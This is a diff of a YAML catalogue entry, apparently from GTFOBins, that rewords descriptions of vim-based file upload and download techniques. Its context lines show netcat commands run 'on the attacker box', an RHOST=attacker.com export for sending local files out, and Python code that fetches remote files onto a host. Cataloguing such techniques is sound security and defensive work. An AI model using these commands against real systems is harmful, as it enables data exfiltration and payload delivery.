@@ -61,7 +61,7 @@ functions:
         else: import SimpleHTTPServer as s, SocketServer as ss
         ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
         vim.command(":q!")'
-    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
+    - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
@@ -84,7 +84,7 @@ functions:
         else: import urllib as r
         r.urlretrieve(e["URL"], e["LFILE"])
         vim.command(":q!")'
-    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
+    - description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
       code: |
         export LPORT=12345
         export LFILE=file_to_save
